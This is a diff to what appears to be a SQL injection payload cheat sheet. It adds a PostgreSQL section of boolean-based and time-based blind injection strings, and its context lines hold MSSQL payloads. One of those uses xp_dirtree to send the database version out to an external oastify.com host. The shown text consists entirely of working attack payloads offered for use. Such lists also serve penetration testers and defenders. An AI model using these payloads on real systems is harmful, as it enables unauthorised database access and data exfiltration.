@@ -120,6 +120,19 @@ allllcs' OR SUBSTRING(CURRENT_USER,1,3)='DBO';--
 ');declare @q varchar(200);set @q='\\fj2meelkqbazaz61dntl0yzycpih69uy.'+(SELECT SUBSTRING(@@version,1,9))+'.oasti'+'fy.com\huh'; exec master.dbo.xp_dirtree @q;--
 ```
 
+## PostgreSQL
+
+```
+-------------------Boolean-Based---------------------
+' or substr(current_database(),1,3) = 'tes
+' or substr(version(),1,10) = 'PostgreSQL
+' and substr(current_schema(),1,6) = 'public
+' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname=public) ORDER BY tablename OFFSET 2 LIMIT 1)::text FROM 2 FOR 1)>90--
+---------------------Time-Based---------------------
+';SELECT PG_SLEEP(5)--
+' AND 6826=(SELECT 6826 FROM PG_SLEEP(5))--
+```
+
 ## NodeJS / MongoDB
 
 ```
